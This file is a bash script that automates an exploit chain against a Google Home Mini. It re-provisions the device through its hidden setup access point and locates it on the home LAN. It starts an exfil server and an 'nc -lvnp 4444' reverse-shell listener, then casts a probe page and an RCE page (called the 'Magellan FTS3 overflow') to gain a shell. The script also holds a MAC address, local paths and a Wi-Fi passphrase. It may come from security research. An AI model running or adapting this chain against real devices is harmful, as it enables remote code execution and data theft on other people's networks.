#!/usr/bin/env bash
# race-provision.sh — provision the Mini and race to catch its LAN IP.
#
# Problem: machine has one Wi-Fi interface. While on setup AP we can't see
# Livebox-C5C0, and vice versa. The Mini briefly joins Livebox-C5C0 (~90s)
# then reverts if no Google provisioning confirmation arrives.
#
# Strategy:
#   1. Start background monitors (exfil server, nc listener) on Livebox first.
#   2. Join setup AP, send connect_wifi (no polling, no --keep).
#   3. Immediately switch back to Livebox-C5C0 — be there when Mini joins.
#   4. Poll ARP for Mini MAC 44:07:0B:D2:6F:36 → get its IP.
#   5. Poll port 8009 until open.
#   6. Cast probe.html → confirm SQLite version via exfil.
#   7. Cast rce.html if confirmed vulnerable.
#
# Usage:
#   bash scripts/race-provision.sh [--probe-only] [--skip-provision]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$SCRIPT_DIR/.."
MAGELLAN="$ROOT/reconstruction/exploit/magellan"
MISE_PY=/home/tkmremi/.local/share/mise/installs/python/latest/bin/python3
MISE_SP=/home/tkmremi/.local/share/mise/installs/python/3.15.1/lib/python3.15/site-packages
MINI_MAC="44:07:0B:D2:6F:36"
MINI_MAC_LOW="44:07:0b:d2:6f:36"
MY_IP="192.168.1.24"
PROBE_ONLY=0
SKIP_PROVISION=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --probe-only)     PROBE_ONLY=1; shift ;;
    --skip-provision) SKIP_PROVISION=1; shift ;;
    *) echo "Unknown: $1"; exit 1 ;;
  esac
done

# ── Update pages with correct PI IP ──────────────────────────────────────────
sed -i "s/const PI *= *\"[^\"]*\";/const PI = \"$MY_IP\";/g" \
  "$MAGELLAN/probe.html" "$MAGELLAN/rce.html" 2>/dev/null || true
sed -i "s/const RPORT *= *[0-9]*;/const RPORT = 4444;/g" \
  "$MAGELLAN/rce.html" 2>/dev/null || true

# ── 1. Start exfil server on Livebox ─────────────────────────────────────────
echo "[*] Starting exfil/page server on $MY_IP:8080/8081..."
pkill -f "exfil_server.py" 2>/dev/null || true
PYTHONPATH="$MISE_SP" $MISE_PY "$MAGELLAN/exfil_server.py" --ip "$MY_IP" &
EXFIL_PID=$!
sleep 0.5

# ── 2. Start reverse shell listener ──────────────────────────────────────────
if [[ "$PROBE_ONLY" -eq 0 ]]; then
  pkill -f "nc -lvnp 4444" 2>/dev/null || true
  echo "[*] Starting nc listener on :4444..."
  nc -lvnp 4444 &
  NC_PID=$!
fi

trap 'echo "[*] Cleanup..."; kill $EXFIL_PID ${NC_PID:-} 2>/dev/null; nmcli con up "Livebox-C5C0" 2>/dev/null || true' EXIT INT TERM

# ── 3. Re-provision (unless skipped) ─────────────────────────────────────────
if [[ "$SKIP_PROVISION" -eq 0 ]]; then
  echo ""
  echo "[*] Joining setup AP to provision..."
  # Quick-connect to setup AP
  PROF="gh-race"
  nmcli con delete "$PROF" 2>/dev/null || true
  nmcli con add type wifi con-name "$PROF" ssid "GoogleHome4983.o," autoconnect no 2>/dev/null
  nmcli con modify "$PROF" 802-11-wireless.hidden yes ipv4.method auto ipv6.method ignore 2>/dev/null
  nmcli con up "$PROF" 2>/dev/null | tail -1
  sleep 3

  # Verify we're on the setup AP
  GW=$(ip route | grep "via " | head -1 | awk '{print $3}')
  echo "[*] Setup AP gateway: $GW"

  # Send connect_wifi — no polling, return immediately
  PYTHONPATH="$MISE_SP" $MISE_PY - <<'PYEOF'
import json, ssl, urllib.request, base64, sys
sys.path.insert(0, "/home/tkmremi/.local/share/mise/installs/python/3.15.1/lib/python3.15/site-packages")
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

base = "https://192.168.255.249:8443"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def api(path, data=None):
    d = json.dumps(data).encode() if data else None
    h = {"Content-Type":"application/json"} if d else {}
    req = urllib.request.Request(base+path, data=d, headers=h, method="POST" if d else "GET")
    with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
        body = r.read()
        return json.loads(body) if body else {}

# get public key
ei = api("/setup/eureka_info")
pub_b64 = ei.get("device_info",{}).get("public_key") or ei.get("public_key")
print(f"[*] pubkey={pub_b64[:40]}...")

# encrypt PSK
psk = "&PI_0123456789="
key = RSA.import_key(base64.b64decode(pub_b64))
enc = base64.b64encode(PKCS1_v1_5.new(key).encrypt(psk.encode())).decode()
print(f"[*] enc_passwd={enc[:40]}...")

# get scan results
nets = api("/setup/scan_results")
target = next((n for n in nets if n.get("ssid") == "Livebox-C5C0"), None)
if not target:
    print(f"[!] Livebox-C5C0 not found. Seen: {[n.get('ssid') for n in nets]}")
    sys.exit(1)
print(f"[*] target: {target['ssid']} {target['bssid']} auth={target.get('wpa_auth')} cipher={target.get('wpa_cipher')}")

# Use auth=4 (WPA2 PSK only) instead of 7 to avoid WPA3 confusion
payload = {
    "ssid": target["ssid"],
    "wpa_auth": 4,   # Force WPA2 PSK
    "wpa_cipher": target.get("wpa_cipher", 4),
    "bssid": target["bssid"],
    "enc_passwd": enc,
}
import urllib.request as ur
req = ur.Request(base+"/setup/connect_wifi",
    data=json.dumps(payload).encode(),
    headers={"Content-Type":"application/json"}, method="POST")
try:
    r = ur.urlopen(req, timeout=15, context=ctx)
    print(f"[*] connect_wifi → {r.status} {r.read()}")
except Exception as e:
    print(f"[!] connect_wifi error: {e}")
print("[*] connect_wifi sent. Switching to home LAN NOW.")
PYEOF

  echo ""
  echo "[*] Switching to Livebox-C5C0 immediately..."
  nmcli con delete "$PROF" 2>/dev/null || true
  nmcli con up "Livebox-C5C0" 2>/dev/null | tail -1
  sleep 2
fi

# ── 4. Poll ARP for Mini's MAC ────────────────────────────────────────────────
echo ""
echo "[*] Watching for Mini MAC $MINI_MAC on LAN (up to 120s)..."
MINI_IP=""
for i in $(seq 1 60); do
  # Force ARP resolution across subnet
  for IP in 192.168.1.{29..60}; do arping -I wlp0s20f3 -c1 -w0.5 "$IP" &>/dev/null & done
  wait

  # Check ARP cache for Mini's MAC
  MINI_IP=$(arp -n 2>/dev/null | grep -i "$MINI_MAC_LOW" | awk '{print $1}' | head -1 || true)
  if [[ -n "$MINI_IP" ]]; then
    echo ""
    echo "[+] Mini found at $MINI_IP!"
    break
  fi
  echo -n "[$i]."
  sleep 2
done
echo ""

if [[ -z "$MINI_IP" ]]; then
  echo "[!] Mini not found in ARP. Scanning all ports 8009 across subnet..."
  for IP in 192.168.1.{1..100}; do
    nc -z -w1 "$IP" 8009 2>/dev/null && { MINI_IP="$IP"; echo "[+] Cast port 8009 open at $IP"; break; }
  done
fi

if [[ -z "$MINI_IP" ]]; then
  echo "[!] Could not find Mini. It may have reverted."
  echo "    Check: nmcli dev wifi list | grep GoogleHome"
  exit 1
fi

# ── 5. Wait for Cast port 8009 ────────────────────────────────────────────────
echo "[*] Mini is at $MINI_IP. Waiting for Cast port 8009..."
for i in $(seq 1 40); do
  if nc -z -w2 "$MINI_IP" 8009 2>/dev/null; then
    echo "[+] Cast port 8009 OPEN!"
    break
  fi
  echo -n "[$i]."
  sleep 2
done
echo ""

# ── 6. Cast probe.html ────────────────────────────────────────────────────────
echo "[*] Casting probe.html to confirm SQLite version..."
PYTHONPATH="$MISE_SP" $MISE_PY "$MAGELLAN/cast_launch.py" \
  "$MINI_IP" "http://${MY_IP}:8080/probe.html" &

echo "[*] Waiting 30s for probe results..."
sleep 30

# ── 7. Check probe results ────────────────────────────────────────────────────
echo ""
echo "[*] Probe results (check exfil_server output above):"
ls -lt "$ROOT/evidence"/magellan-exfil-*.json 2>/dev/null | head -3 | while read line; do
  f=$(echo "$line" | awk '{print $NF}')
  echo "    $f:"
  python3 -m json.tool "$f" 2>/dev/null | grep -E "msg|sqlite|VULNERABLE|version" | head -5
done

if [[ "$PROBE_ONLY" -eq 1 ]]; then
  echo "[*] --probe-only done."
  exit 0
fi

# ── 8. Prompt for RCE ────────────────────────────────────────────────────────
echo ""
read -r -p "Launch rce.html? [y/N] " yn
[[ "$yn" != "y" && "$yn" != "Y" ]] && exit 0

echo "[*] Casting rce.html → Magellan FTS3 overflow..."
PYTHONPATH="$MISE_SP" $MISE_PY "$MAGELLAN/cast_launch.py" \
  "$MINI_IP" "http://${MY_IP}:8080/rce.html"
echo "[*] Waiting 60s for reverse shell..."
sleep 60
